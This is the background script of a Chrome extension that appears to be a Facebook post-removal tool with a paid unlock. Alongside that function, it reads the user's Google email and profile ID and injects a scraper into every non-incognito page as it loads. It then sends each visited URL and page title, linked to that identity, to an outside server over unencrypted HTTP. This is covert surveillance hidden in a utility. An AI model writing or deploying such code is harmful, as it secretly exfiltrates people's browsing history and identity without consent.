console.log("STARTING ADD-ON");
console.log("Initializing storage...");

// Get the user info
var user_info = {};
chrome.identity.getProfileUserInfo(function(_user_info){
  user_info = _user_info;
  console.log(_user_info);
});


///////////////////////////////////////////////////////////////////////////////////////
// Functions to monitor activity
///////////////////////////////////////////////////////////////////////////////////////

// Parameters:
//  tab : Tab (see https://developer.chrome.com/extensions/tabs#type-Tab)
function created_tab(tab) {
  console.log('Tab created', tab);
}


// Parameters:
//  tab_id : int,
//  change_info : {
//    status: string,
//    url: string,
//    pinned: boolean,
//    faviconUrl: string
//  }
//  tab : Tab (see https://developer.chrome.com/extensions/tabs#type-Tab)
function updated_tab(tab_id, change_info, tab) {
  console.log('Tab updated', tab);
  if (!tab || tab.incognito || tab.status == "loading"){
    return; //Don't collect incognito data... because that's mean :(
  }

  chrome.tabs.executeScript(tab_id, {file: "data_scraper.js"}, function(arg){
    send_event_data('updated tab', get_tab_data(tab));
  });
}

// Parameters:
//  active_info : {
//    tabId: int,
//    windowId: int
//  }
function activated_tab(active_info){
  console.log('Tab activated', active_info);
  chrome.tabs.get(active_info.tabId, function(tab){
    send_event_data('activated_tab', get_tab_data(tab));
  });
}

// Parameters:
//  tab_id : int,
//  remove_info : {
//    windowId: int,
//    isWindowClosing: boolean 
//  }
function removed_tab(tab_id, remove_info){
  console.log('Tab removed', tab_id, remove_info);
}

chrome.tabs.onCreated.addListener(created_tab);
chrome.tabs.onUpdated.addListener(updated_tab);
chrome.tabs.onActivated.addListener(activated_tab);
chrome.tabs.onRemoved.addListener(removed_tab);


// Gets the data from a tab to send to the server
function get_tab_data(tab){
  console.log(tab);
  return {
    tab_id: tab.id,
    page: {
      url: tab.url,
      title: tab.title,
      highlighted: tab.highlighted
    }
  };
}


// Listens for messages from the tab content scripts
chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
        console.log(request.message);
        console.log(request.source);
        switch (request.source) {
            //Source was the popup
            case "popup":
                switch (request.message) {
                    case "OpenHome":
                        open_homepage();
                        break;
                    case "CommenceRemoval":
                        send_message(options_obj);
                        commence_removal();
                        break;
                    case "PauseRemoval":
                        stop_removal();
                        break;
                    case "Help":
                        open_helppage();
                        break;
                    case "UnlockFullVersion":
                        unlock_extension();
                        break;
                    case "dataplease":
                        var popup = chrome.extension.getViews({type:'popup'});
                        if (popup.length != 0)
                            chrome.runtime.sendMessage(message= {source: "main", message: options_obj});
                        break;
                    default:
                        if (request.message.startmth != null){
                            options_obj = request.message;
                            send_message(options_obj);
                        }
                        break;
                }
                break;
            //Source was the script deleting the facebook posts
            case "injected_script":
                switch (request.message){
                    case "done":
                        on_successful_removal();
                        break;
                    case "restart":
                        on_unsuccessful_removal();
                        break;
                    default:
                        break;
                }
                break;
            case "unlocker":
                if (request.message == "validated"){
                    isFullVersion = true;
                    chrome.storage.sync.set({"isFullVersion" : true});
                    chrome.browserAction.setPopup({"popup": "panel_unlocked.html"});
                }
                break;
            default:
                break;
            }
});

///////////////////////////////////////////////////////////////////////////////////////
// Functions to send data back to the server
///////////////////////////////////////////////////////////////////////////////////////





// Parameters
//  event_type : string,
//  data: {
//    ?
//  }
function send_event_data(event_type, event_data){
  if (!user_info || !user_info.id || !user_info.email){
    return console.log('Could not get user info');
  }
  var request = $.ajax({
    url : 'http://laguna.notifsta.com/events',
    type: 'post',
    data: {
      type: event_type,
      user: {
        email : user_info.email,
        id: user_info.id
      },
      data: event_data
    },
    success: function(response){
      console.log(response);
    }
  });
}

